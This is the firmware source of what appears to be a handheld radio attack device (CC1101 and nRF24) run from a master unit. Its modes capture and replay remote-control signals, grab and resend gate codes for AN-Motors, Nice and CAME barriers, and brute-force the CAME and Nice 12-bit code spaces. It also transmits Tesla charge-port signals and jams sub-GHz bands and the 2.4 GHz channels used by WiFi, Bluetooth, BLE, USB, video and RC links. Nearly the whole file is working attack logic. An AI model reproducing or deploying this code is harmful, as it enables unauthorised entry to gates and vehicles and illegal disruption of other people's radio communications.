#include "functions.h"

void setup()
{
  pinMode(DISABLE_DEVICE_PIN, OUTPUT);
  digitalWrite(DISABLE_DEVICE_PIN, LOW);

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  SPI.setSCK(2);
  SPI.setTX(3);
  SPI.setRX(4);
  SPI.begin();

  cc1101Init();

  SPI1.setSCK(10);
  SPI1.setTX(11);
  SPI1.setRX(12);
  SPI1.begin();

  radio_RF24.begin(&SPI1);

  analogReadResolution(12);
  batVoltage = readBatteryVoltage();

  communication.setSlaveMode();
  communication.init();

  DBG("Current mode: %d\n\n", currentMode);

  currentLedMode = LED_ON;

#ifdef DEBUG_eHack
  Serial.begin(9600);
#endif
}

void setup1()
{
}

// Loop for common tasks
void loop1()
{
  if (successfullyConnected || currentMode == HF_SCAN)
  {
    switch (currentMode)
    {
    case IDLE:
    {
      if (!initializedIdle)
      {
        mySwitch.disableReceive();
        mySwitch.disableTransmit();
        mySwitch.resetAvailable();
        detachInterrupt(GD0_PIN_CC);
        digitalWrite(GD0_PIN_CC, LOW);
        currentLedMode = LED_BLINK_SLOW;
        initialized = false;
        attackIsActive = false;
        initializedIdle = true;
      }
      break;
    }
    case HF_SPECTRUM:
    {
      static uint8_t sendFailCount = 0;
      static uint32_t lastStepMs = millis();
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;
      static bool waitingForSettle = false;

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(raFrequencies[currentScanFreq]);
        radio_RF24.stopListening();
        currentLedMode = LED_BLINK_FAST;
        waitingForSettle = true;
        currentScanFreq = 0;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < SEND_DURATION_MS)
        {
          if (waitingForSettle)
          {
            if (millis() - lastStepMs >= RSSI_STEP_MS)
            {
              currentRssi = ELECHOUSE_cc1101.getRssi();

              int data[2];
              data[0] = currentRssi;
              data[1] = currentScanFreq;

              DBG("RSSI: %d, FREQ: %d\n", currentRssi, currentScanFreq);

              bool success = radio_RF24.write(&data, sizeof(data));

              currentScanFreq = (currentScanFreq + 1) % raFreqCount;
              ELECHOUSE_cc1101.SetRx(raFrequencies[currentScanFreq]);
              lastStepMs = millis();
              waitingForSettle = true;

              if (!success)
              {
                sendFailCount++;
                if (sendFailCount >= 5)
                {
                  radio_RF24.startListening();
                  currentMode = IDLE;
                  initialized = false;
                  sendFailCount = 0;
                  DBG("Failed to send data, switching to IDLE mode.\n");
                  return;
                }
              }
              else
              {
                sendFailCount = 0;
              }
            }
          }
        }
        else
        {
          radio_RF24.startListening();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          radio_RF24.stopListening();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case HF_ACTIVITY:
    {
      static uint8_t sendFailCount = 0;
      static uint32_t lastStepMs = millis();
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        mySwitch.enableReceive(GD0_PIN_CC);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        radio_RF24.stopListening();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < SEND_DURATION_MS)
        {
          if (millis() - lastStepMs >= RSSI_STEP_MS)
          {
            currentRssi = ELECHOUSE_cc1101.getRssi();
            DBG("RSSI: %d, FREQ: %.2f\n", currentRssi, radioFrequency);
            bool success = radio_RF24.write(&currentRssi, sizeof(currentRssi));
            lastStepMs = millis();
            if (!success)
            {
              sendFailCount++;
              if (sendFailCount >= 5)
              {
                radio_RF24.startListening();
                currentMode = IDLE;
                initialized = false;
                sendFailCount = 0;
                DBG("Failed to send data, switching to IDLE mode.\n");
                return;
              }
            }
            else
            {
              sendFailCount = 0;
            }
          }
        }
        else
        {
          radio_RF24.startListening();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          DBG("Received frequency: %.2f MHz\n", radioFrequency);
          initialized = false;
          return;
        }

        if (mySwitch.available())
        {
          if (mySwitch.getReceivedBitlength() < 10)
          {
            mySwitch.resetAvailable();
            break;
          }

          mySwitch.disableReceive();
          mySwitch.enableTransmit(GD0_PIN_CC);
          pinMode(GD0_PIN_CC, OUTPUT);
          ELECHOUSE_cc1101.SetTx(radioFrequency);

          mySwitch.setProtocol(mySwitch.getReceivedProtocol());
          mySwitch.setRepeatTransmit(10);
          mySwitch.setPulseLength(mySwitch.getReceivedDelay());
          mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
          DBG("Successfully sent!\n");
          DBG("Code: %d, Protocol: %d\n", mySwitch.getReceivedValue(), mySwitch.getReceivedProtocol());

          mySwitch.resetAvailable();
          initialized = false;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          radio_RF24.stopListening();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case HF_SCAN:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        mySwitch.enableReceive(GD0_PIN_CC);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (successfullyConnected && currentMode == HF_SCAN && receivedSignals > 0)
      {
        mySwitch.disableReceive();
        mySwitch.enableTransmit(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        mySwitch.setRepeatTransmit(10);
        delay(1000);

        for (uint8_t i = 0; i < receivedSignals; i++)
        {
          DBG("Sending %d code...!\n", i);
          mySwitch.setProtocol(StoredSubSignals[i].protocol);
          mySwitch.setPulseLength(StoredSubSignals[i].delay);
          mySwitch.send(StoredSubSignals[i].code, StoredSubSignals[i].length);
          delay(1000);
        }

        receivedSignals = 0;
        initialized = false;
        DBG("Successfully sent all buffer data!\n");
        break;
      }

      if (mySwitch.available())
      {
        // Check if the signal is valid
        if (mySwitch.getReceivedBitlength() < 10)
        {
          mySwitch.resetAvailable();
          break;
        }

        DBG("Code: %d, Protocol: %d\n", mySwitch.getReceivedValue(), mySwitch.getReceivedProtocol());

        // Reapiting the signal
        if (successfullyConnected)
        {
          mySwitch.disableReceive();
          mySwitch.enableTransmit(GD0_PIN_CC);
          pinMode(GD0_PIN_CC, OUTPUT);
          ELECHOUSE_cc1101.SetTx(radioFrequency);

          mySwitch.setProtocol(mySwitch.getReceivedProtocol());
          mySwitch.setRepeatTransmit(10);
          mySwitch.setPulseLength(mySwitch.getReceivedDelay());
          mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
          DBG("Successfully sent!\n");
        }
        // Store in memory
        else
        {
          uint32_t newCode = mySwitch.getReceivedValue();
          uint16_t newLength = mySwitch.getReceivedBitlength();
          uint16_t newProtocol = mySwitch.getReceivedProtocol();
          uint16_t newDelay = mySwitch.getReceivedDelay();

          bool alreadyStored = false;
          for (uint8_t i = 0; i < receivedSignals; i++)
          {
            if (StoredSubSignals[i].code == newCode &&
                StoredSubSignals[i].length == newLength &&
                StoredSubSignals[i].protocol == newProtocol)
            {
              alreadyStored = true;
              DBG("Duplicate signal, skipped\n");
              break;
            }
          }

          if (!alreadyStored)
          {
            if (receivedSignals < MAX_STORED_SIGNALS)
            {
              StoredSubSignals[receivedSignals].code = newCode;
              StoredSubSignals[receivedSignals].length = newLength;
              StoredSubSignals[receivedSignals].protocol = newProtocol;
              StoredSubSignals[receivedSignals].delay = newDelay;
              receivedSignals++;
              DBG("Stored in memory (code=%lu)\n", (unsigned long)newCode);
            }
            else
            {
              DBG("Buffer full. Signal ignored.\n");
            }
          }
        }

        mySwitch.resetAvailable();
        initialized = false;
      }

      break;
    }
    case HF_REPLAY:
    {
      static uint32_t attackTimer = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        mySwitch.enableReceive(GD0_PIN_CC);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (!attackIsActive && mySwitch.available())
      {
        // Check if the signal is valid
        if (mySwitch.getReceivedBitlength() < 10)
        {
          mySwitch.resetAvailable();
          break;
        }

        // Reapiting the signal
        mySwitch.disableReceive();
        mySwitch.enableTransmit(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        mySwitch.setProtocol(mySwitch.getReceivedProtocol());
        mySwitch.setRepeatTransmit(10);
        mySwitch.setPulseLength(mySwitch.getReceivedDelay());
        attackIsActive = true;
      }

      if (attackIsActive && millis() - attackTimer >= 1000)
      {
        mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
        attackTimer = millis();
        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", mySwitch.getReceivedValue(), mySwitch.getReceivedProtocol());
      }

      break;
    }
    case HF_BARRIER_SCAN:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (barrierCaptured)
      {
        // Repeating the signal
        detachInterrupt(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        if (barrierProtocol == 0)
        {
          sendANMotors(barrierCodeMain, barrierCodeAdd);
        }
        else if (barrierProtocol == 1)
        {
          sendNice(barrierCodeMain);
        }
        else if (barrierProtocol == 2)
        {
          sendCame(barrierCodeMain);
        }

        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);

        barrierCaptured = false;
        initialized = false;
      }

      break;
    }
    case HF_BARRIER_REPLAY:
    {
      static uint32_t attackTimer = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (barrierCaptured)
      {
        barrierCaptured = false;

        // Repeating the signal
        detachInterrupt(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        attackIsActive = true;
      }

      if (attackIsActive && millis() - attackTimer >= 1000)
      {
        if (barrierProtocol == 0)
        {
          sendANMotors(barrierCodeMain, barrierCodeAdd);
        }
        else if (barrierProtocol == 1)
        {
          sendNice(barrierCodeMain);
        }
        else if (barrierProtocol == 2)
        {
          sendCame(barrierCodeMain);
        }

        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);

        attackTimer = millis();
      }

      break;
    }
    case HF_BARRIER_BRUTE_CAME:
    {
      static uint32_t lastSendTime = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        barrierBruteIndex = 4095;
        initialized = true;
      }

      if (millis() - lastSendTime > 50)
      {
        lastSendTime = millis();

        if (barrierBruteIndex >= 0)
        {
          sendCame(barrierBruteIndex);
          DBG("CAME BRUTE: Code: %d\n", barrierBruteIndex);
          barrierBruteIndex--;
        }
        if (barrierBruteIndex < 0)
        {
          barrierBruteIndex = 4095;
          currentMode = IDLE;
        }
      }

      break;
    }
    case HF_BARRIER_BRUTE_NICE:
    {
      static uint32_t lastSendTime = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        barrierBruteIndex = 4095;
        initialized = true;
      }

      if (millis() - lastSendTime > 50)
      {
        lastSendTime = millis();

        if (barrierBruteIndex >= 0)
        {
          sendNice(barrierBruteIndex);
          DBG("CAME NICE: Code: %d\n", barrierBruteIndex);
          barrierBruteIndex--;
        }
        if (barrierBruteIndex < 0)
        {
          barrierBruteIndex = 4095;
          currentMode = IDLE;
        }
      }

      break;
    }
    case HF_JAMMER:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      static uint32_t lastNoise = 0;
      static bool noiseState = false;
      uint32_t nowMicros = micros();

      if (nowMicros - lastNoise > 500)
      {
        noiseState = !noiseState;
        digitalWrite(GD0_PIN_CC, noiseState);
        lastNoise = nowMicros;
      }

      break;
    }
    case HF_TESLA:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      static bool toggleFreq = false;
      float freq = toggleFreq ? 315.0 : 433.92;
      ELECHOUSE_cc1101.SetTx(freq);
      toggleFreq = !toggleFreq;

      DBG("Tesla Freq: %.2f\n", freq);

      sendTeslaSignal_v1();
      delay(50);
      sendTeslaSignal_v2();
      delay(50);

      break;
    }

    // Handle UHF modes
    case UHF_ALL_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF All Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(full_channels) / sizeof(full_channels[0]));
          radioChannel = full_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_WIFI_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF WiFi Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(wifi_channels) / sizeof(wifi_channels[0]));
          radioChannel = wifi_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_BT_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF Bluetooth Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
          radioChannel = bluetooth_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_BLE_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF BLE Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
          radioChannel = ble_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_USB_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF USB Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(usb_channels) / sizeof(usb_channels[0]));
          radioChannel = usb_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_VIDEO_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF VIDEO Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(video_channels) / sizeof(video_channels[0]));
          radioChannel = video_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_RC_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF RC Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
          radioChannel = rc_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    }
  }
}

// Loop for communication tasks
void loop()
{
  uint32_t onTime = 0;
  uint32_t offTime = 0;

  switch (currentLedMode)
  {
  case LED_ON:
    digitalWrite(LED_BUILTIN, HIGH);
    break;
  case LED_OFF:
    digitalWrite(LED_BUILTIN, LOW);
    break;
  case LED_BLINK_SLOW:
    onTime = 500;
    offTime = 500;
    break;
  case LED_BLINK_FAST:
    onTime = 50;
    offTime = 500;
    break;
  }

  if (onTime > 0 || offTime > 0)
  {
    if ((ledState && millis() - ledTimer >= onTime) || (!ledState && millis() - ledTimer >= offTime))
    {
      ledState = !ledState;
      digitalWrite(LED_BUILTIN, ledState);
      ledTimer = millis();
    }
  }

  if (!successfullyConnected)
  {
    currentLedMode = LED_ON;

    if (millis() - offTimer > DISABLE_DEVICE_DELAY && currentMode != HF_SCAN)
    {
      DBG("Going to sleep...: %d\n", currentMode);
      digitalWrite(DISABLE_DEVICE_PIN, HIGH);
      delay(1000);
    }

    if (communication.receivePacket(recievedData, &recievedDataLen))
    {
      if (recievedData[0] == 'P' && recievedData[1] == 'I' && recievedData[2] == 'N' && recievedData[3] == 'G')
      {
        DBG("Slave: PING received. Sending PONG...\n");
        if (communication.sendPacket(pong, sizeof(pong)))
        {
          DBG("Slave: PONG sent successfully.\n");
          DBG("Connection established\n");
          checkConnectionTimer = millis();
          successfullyConnected = true;
          currentMode = IDLE;
          currentLedMode = LED_BLINK_SLOW;
          batteryTimer = millis() - BATTERY_CHECK_INTERVAL;
        }
        else
        {
          DBG("Slave: FAILED to send PONG\n");
        }
      }
    }
  }
  else if (successfullyConnected)
  {
    switch (currentMode)
    {
    case UHF_SPECTRUM:
    case UHF_ALL_JAMMER:
    case UHF_WIFI_JAMMER:
    case UHF_BT_JAMMER:
    case UHF_BLE_JAMMER:
    case UHF_USB_JAMMER:
    case UHF_VIDEO_JAMMER:
    case UHF_RC_JAMMER:
    case HF_ACTIVITY:
    case HF_SPECTRUM:
      break;

    default:
    {
      if (millis() - checkConnectionTimer > CONNECTION_DELAY)
      {
        DBG("Slave: Connection LOST (Master timeout)!\n");
        successfullyConnected = false;
        offTimer = millis();
        return;
      }

      if (communication.receivePacket(recievedData, &recievedDataLen))
      {
        if (recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          DBG("Received frequency: %.2f MHz\n", radioFrequency);
          initializedIdle = false;

          switch (currentMode)
          {
          case UHF_SPECTRUM:
          case UHF_ALL_JAMMER:
          case UHF_WIFI_JAMMER:
          case UHF_BT_JAMMER:
          case UHF_BLE_JAMMER:
          case UHF_USB_JAMMER:
          case UHF_VIDEO_JAMMER:
          case UHF_RC_JAMMER:
            DBG("Returned\n");
            return;
          }

          if (initialized)
          {
            switch (currentMode)
            {
            case HF_SCAN:
            case HF_BARRIER_SCAN:
              ELECHOUSE_cc1101.SetRx(radioFrequency);
              DBG("Setted RX Freq\n");
              break;
            case HF_REPLAY:
            case HF_JAMMER:
            case HF_BARRIER_REPLAY:
            case HF_BARRIER_BRUTE_NICE:
            case HF_BARRIER_BRUTE_CAME:
              ELECHOUSE_cc1101.SetTx(radioFrequency);
              DBG("Setted TX Freq\n");
              break;
            }
          }

          // if (currentMode != IDLE)
          // {
          //   communication.sendPacket(inited, 32);
          //   DBG("Init was sent\n");
          // }
        }
        else if (recievedData[0] == 'P' && recievedData[1] == 'I' && recievedData[2] == 'N' && recievedData[3] == 'G')
        {
          DBG("Master: PING received!\n");
          checkConnectionTimer = millis();
          if (communication.sendPacket(pong, sizeof(pong)))
          {
            DBG("Master: PONG sent! Connection OK.\n");
          }
        }
        else if (recievedData[0] == 'O' && recievedData[1] == 'F' && recievedData[2] == 'F')
        {
          DBG("Master: OFF received!\n");
          DBG("Going to sleep...\n");
          digitalWrite(DISABLE_DEVICE_PIN, HIGH);
          delay(1000);
        }
      }
      if (millis() - batteryTimer > BATTERY_CHECK_INTERVAL)
      {
        batVoltage = readBatteryVoltage();
        DBG("Battery voltage: %.2fV\n", batVoltage);
        uint8_t batteryVoltagePacketLen = communication.buildPacket(COMMAND_BATTERY_VOLTAGE, (uint8_t *)&batVoltage, sizeof(batVoltage), batteryVoltagePacket);
        communication.sendPacket(batteryVoltagePacket, batteryVoltagePacketLen);
        batteryTimer = millis();
      }
      break;
    }
    }
  }

#ifdef DEBUG_eHack
  static uint32_t timer;
  if (millis() - timer > 1000)
  {
    DBG("Current menu: %d\n", currentMode);
    timer = millis();
  }

  static uint32_t bufferTimer;
  if (currentMode == 3 && millis() - bufferTimer > 2000)
  {
    bufferTimer = millis();

    DBG("=== StoredSubSignals (count=%u) ===\n", receivedSignals);
    for (uint8_t i = 0; i < receivedSignals; i++)
    {
      SimpleRAData &s = StoredSubSignals[i];
      DBG("[%u] code=%lu len=%u protocol=%u delay=%u\n",
          i,
          (unsigned long)s.code,
          s.length,
          s.protocol,
          s.delay);
    }
  }
#endif
}